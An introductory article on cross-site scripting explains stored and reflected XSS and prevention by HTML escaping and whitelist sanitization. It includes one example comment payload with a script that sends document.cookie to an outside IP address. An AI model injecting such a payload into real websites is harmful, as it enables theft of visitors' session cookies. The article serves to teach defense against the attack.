# Cross Site Scripting

Author: Tan Wang Leng

## Overview

Cross site scripting (XSS) is a vulnerability found in websites.

Text boxes are commonly used in forms in websites to ask the user for input. For
example, blog websites may provide a text box for visitors of the blog to enter comments.

However, are commenters limited to just typing in plain text? Some website do not
check the input, thus commenters are able to use formatting HTML tags, such
as `<b>` for bolding and `<i>` for italicizing.

```html
I <b>like</b> your blog post!
```

becomes: I **like** your blog post!

The problem arises when the commenter starts using HTML for malicious purposes. For
example, HTML also supports `<script>`, for you to write JavaScript code on the
webpage as well.

```html
This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
```

While visitors of the blog will only see the non-script portion of the
comments (i.e. `This is an innocent looking comment.`), the browser will not
show the script portion of the comment, because it is legal HTML (you won't see
the tags like `<b>` and `<i>` when viewing webpages, so you definitely won't see
`<script>` on the webpage).

However, the browser is **actually executing the script**. Therefore, the hacker
can write any script that he wants (in our example, a function to send to the
hacker the user's cookies), without the user even being aware of what's going
on.

Therefore, the hacker has managed to add additional malicious "functionality" to
the website, that is not written by the original website developer.

Resources:

1. http://projects.webappsec.org/f/WASC-TC-v2_0.pdf (page 32)
1. http://guides.rubyonrails.org/security.html#cross-site-scripting-xss
1. https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29
1. http://www.symantec.com/connect/blogs/cross-site-scripting-vulnerabilities

## Types of Cross Site Scripting

There are no standard definitions, but there are at least two different types of
XSS:

* Persistent XSS (also known as stored XSS) - The JavaScript code gets stored in
the web server. Example: Posting a malicious JavaScript code into a blog post as
a comment. The comment gets stored in the database, and the web browser of future visitors of the
webpage will retrieve the comment from the database, resulting in execution.

* Non-persistent XSS (also known as reflected XSS) - The JavaScript code is
inserted in URL/links of website that accepts URL parameters as input. The input
is therefore not stored in a database. For example:

`https://www.ecard.com/view-ecard.php?content=Happy%20Holidays<script>...</script>`

Resources:

1. http://projects.webappsec.org/f/WASC-TC-v2_0.pdf (page 33)
1. https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks
1. http://security.stackexchange.com/questions/65142/what-is-reflected-xss

## Preventing Cross Site Scripting

There are a couple of ways to prevent your website against XSS. The two most
common ways are:

* Escaping String Input: By converting legal HTML characters to their
display-equivalent (e.g. `<` to `&lt;`), you prevent the symbol from being
parsed as HTML. It now even shows the content on the screen (in case the actual
intention is to actually show someone how to code for example).

* Whitelist Sanitization: By scanning and parsing the input as HTML, you can
remove undesired HTML elements, and only allowing certain whitelisted HTML
elements to be used (e.g. whitelisting only `<b>` and `<i>`).

Resources:

1. https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
(2.2 RULE #1 - HTML Escape Before Inserting Untrusted Data into HTML Element Content)
(2.7 RULE #6 - Sanitize HTML Markup with a Library Designed for the Job)
1. https://github.com/OWASP/java-html-sanitizer
1. https://github.com/rails/rails_xss
1. http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html
